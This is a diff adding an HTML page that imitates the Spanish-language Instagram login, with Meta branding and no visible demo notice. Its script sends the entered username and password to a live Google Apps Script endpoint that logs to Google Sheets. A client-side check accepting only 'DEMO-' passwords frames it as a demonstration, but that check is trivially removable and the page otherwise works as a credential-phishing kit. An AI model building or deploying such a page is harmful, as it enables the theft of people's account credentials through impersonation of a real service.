@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <style>
+    *{box-sizing:border-box}
+    :root{
+      --bg:#0b1015;
+      --panel:#1d1d20;
+      --line:#34363b;
+      --text:#f4f4f5;
+      --muted:#a8a8ad;
+      --blue:#355a92;
+      --demo:#ffcc00;
+      --danger:#ff496a;
+    }
+    html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#090d12;color:var(--text)}
+    .demo-banner{
+      position:fixed;z-index:50;top:0;left:0;right:0;
+      background:var(--demo);color:#171717;
+      padding:10px 16px;text-align:center;font-weight:900;
+      letter-spacing:.4px;font-size:14px;
+      border-bottom:2px solid #fff3a8;
+    }
+    .page{
+      min-height:100vh;
+      display:grid;
+      grid-template-columns:66% 34%;
+      padding-top:40px;
+    }
+    .left{
+      position:relative;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
+      overflow:hidden;
+      border-right:1px solid #494b50;
+      background:
+        radial-gradient(circle at 45% 60%,rgba(124,58,237,.14),transparent 24%),
+        radial-gradient(circle at 60% 63%,rgba(236,72,153,.10),transparent 28%),
+        #0a0f14;
+    }
+    .fake-logo{
+      position:absolute;left:48px;top:50px;
+      width:66px;height:66px;border-radius:19px;padding:5px;
+      background:linear-gradient(135deg,#7c3aed,#ec4899,#f97316);
+    }
+    .fake-logo:before{
+      content:"";display:block;width:100%;height:100%;border:5px solid white;
+      border-radius:16px;box-sizing:border-box;
+    }
+    .fake-logo:after{
+      content:"";position:absolute;left:24px;top:24px;width:17px;height:17px;
+      border:5px solid white;border-radius:50%;
+    }
+    .headline{text-align:center;margin-top:-80px}
+    .headline h1{font-size:48px;line-height:1.2;margin:0;font-weight:600}
+    .headline .gradient{
+      background:linear-gradient(90deg,#ff5858,#ff0080,#c800ff);
+      -webkit-background-clip:text;background-clip:text;color:transparent
+    }
+    .cards{
+      position:relative;width:520px;height:390px;margin-top:35px;
+    }
+    .card{
+      position:absolute;border-radius:30px;border:1px solid #ffffff22;
+      box-shadow:0 22px 50px #0008;overflow:hidden;
+    }
+    .c1{width:230px;height:310px;left:30px;top:45px;transform:rotate(-5deg);
+      background:linear-gradient(140deg,#126a4b,#24bd76 45%,#ff2ba6)}
+    .c2{width:250px;height:355px;left:150px;top:0;z-index:3;
+      background:linear-gradient(150deg,#ddc38b,#2e394a 55%,#050607)}
+    .c3{width:180px;height:300px;right:0;top:55px;transform:rotate(5deg);
+      background:linear-gradient(135deg,#c61b39,#eee,#3d2430)}
+    .emoji{position:absolute;z-index:10;background:#fff;color:#222;border-radius:20px;padding:7px 12px;left:95px;top:12px}
+    .heart{position:absolute;z-index:9;left:0;bottom:80px;font-size:65px;color:#ff245d}
+    .right{
+      display:flex;justify-content:center;align-items:center;
+      background:#1d1d20;padding:34px;
+    }
+    .login{width:min(500px,100%)}
+    .login h2{font-size:17px;margin-bottom:22px}
+    .warning{
+      border:1px solid #665400;background:#332b00;color:#ffe886;
+      border-radius:12px;padding:12px 14px;font-size:13px;line-height:1.45;margin-bottom:16px;
+    }
+    input{
+      width:100%;height:57px;margin-bottom:12px;border-radius:14px;border:1px solid #5a5d64;
+      background:#202024;color:white;padding:0 16px;font-size:15px;outline:none
+    }
+    input:focus{border-color:#8798bf}
+    button{
+      width:100%;height:48px;border:0;border-radius:24px;background:#31568c;color:#dfe8fa;
+      font-size:15px;font-weight:700;margin-top:6px;cursor:pointer
+    }
+    .small{text-align:center;color:#ddd;margin:22px 0;font-size:14px}
+    .fake-fb,.fake-create{
+      width:100%;height:46px;border-radius:24px;display:grid;place-items:center;
+      background:#29292c;border:1px solid #29292c;color:#d8d8dd;margin-top:10px;font-size:14px
+    }
+    .fake-create{background:transparent;border-color:#2684ff;color:#58a9ff}
+    .brand{text-align:center;margin-top:22px;color:#ddd;font-weight:700}
+    #status{
+      margin-top:15px;padding:12px;border-radius:12px;display:none;
+      background:#152516;color:#c7f9cb;border:1px solid #35683b;font-size:14px;line-height:1.4
+    }
+    .lesson{
+      position:fixed;left:18px;bottom:18px;z-index:20;width:min(390px,calc(100vw - 36px));
+      background:#101820dd;border:1px solid #45515f;border-radius:14px;padding:14px;
+      backdrop-filter:blur(7px);font-size:13px;line-height:1.45
+    }
+    .lesson b{color:#ffd84d}
+    @media(max-width:900px){
+      .page{grid-template-columns:1fr}
+      .left{min-height:58vh;border-right:0;border-bottom:1px solid #494b50}
+      .right{min-height:42vh}
+      .headline h1{font-size:34px}.headline{margin-top:10px}
+      .cards{transform:scale(.75);margin-top:-10px;height:300px}
+      .fake-logo{top:30px;left:28px}
+    }
+  </style>
+</head>
+<body>
+
+  <main class="page">
+    <section class="left">
+      <div class="fake-logo" aria-hidden="true"></div>
+      <div class="headline">
+        <h1>Mira los momentos cotidianos<br>de tus <span class="gradient">mejores amigos.</span></h1>
+      </div>
+      <div class="cards" aria-hidden="true">
+        <div class="card c1"></div><div class="card c2"></div><div class="card c3"></div>
+        <div class="emoji">🟣 👀 😺</div><div class="heart">♥</div>
+      </div>
+    </section>
+
+    <section class="right">
+      <div class="login">
+        <h2>Iniciar sesión en Instagram</h2>
+
+        <form id="demoForm">
+          <input id="usuario" required autocomplete="off"
+                 placeholder="Numero de celular, nombre de usuario o correo electrónico">
+          <input id="codigo" required autocomplete="off"
+                 placeholder="Contraseña">
+          <button type="submit">Iniciar sesión</button>
+        </form>
+
+        <div id="status"></div>
+        <div class="small">¿Olvidaste tu contraseña?</div>
+        <div class="fake-create">Crear cuenta</div>
+        <div class="brand">◎ Meta</div>
+      </div>
+    </section>
+  </main>
+
+
+
+<script>
+  // Sustituye esto por la URL /exec de tu Google Apps Script.
+  const ENDPOINT = "https://script.google.com/macros/s/AKfycbzBjI73RFrBGR8gAS-8WR7jDr1VD6-PNC7xv7ub_08hQXa2lgDGdO_3Y4VNap5XXaW_Ng/exec";
+
+  document.getElementById("demoForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const status = document.getElementById("status");
+    const usuario = document.getElementById("usuario").value.trim();
+    const codigo = document.getElementById("codigo").value.trim();
+
+    // Solo permite códigos claramente ficticios.
+    if (!/^DEMO-/i.test(codigo)) {
+      status.style.display = "block";
+      status.style.background = "#2b1518";
+      status.style.color = "#ffd3d9";
+      status.style.borderColor = "#7c343e";
+      status.textContent = 'Por seguridad, usa un código ficticio que empiece por "DEMO-".';
+      return;
+    }
+
+    if (ENDPOINT.includes("PEGA_AQUI")) {
+      status.style.display = "block";
+      status.textContent = "Configura primero la URL de Google Apps Script en index.html.";
+      return;
+    }
+
+    const payload = {
+      usuario_demo: usuario,
+      codigo_demo: codigo,
+      url_visible: location.href,
+      fecha_cliente: new Date().toISOString()
+    };
+
+    try {
+      await fetch(ENDPOINT, {
+        method:"POST",
+        headers:{"Content-Type":"text/plain;charset=utf-8"},
+        body:JSON.stringify(payload)
+      });
+
+      status.style.display = "block";
+      status.style.background = "#152516";
+      status.style.color = "#c7f9cb";
+      status.style.borderColor = "#35683b";
+      status.textContent =
+        "Demostración completada: los datos ficticios viajaron desde el navegador hasta Google Sheets.";
+      e.target.reset();
+    } catch(err) {
+      status.style.display = "block";
+      status.textContent = "Error de demostración. Revisa el despliegue del Apps Script.";
+    }
+  });
+</script>
+</body>
+</html>
